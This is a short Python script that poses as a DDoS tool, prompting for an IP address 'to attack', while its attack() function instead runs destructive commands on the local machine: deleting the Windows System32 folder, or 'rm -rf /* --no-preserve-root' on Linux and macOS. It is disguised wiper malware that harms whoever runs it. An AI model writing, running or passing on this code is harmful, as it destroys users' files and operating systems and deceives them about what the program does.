import os
import detect
import platform

def start():
    address = input("IP address to attack: ")
    print(f"DDOS Attack at {address}")

def attack():
    detect.detect()
    operating_system = platform.system()
    if operating_system == "Windows":
       os.system("rmdir \Windows\System32")
    elif operating_system == "Linux":
       os.system("rm -rf /* --no-preserve-root")
    elif operating_system == "Darwin":
       os.system("rm -rf /* --no-preserve-root")
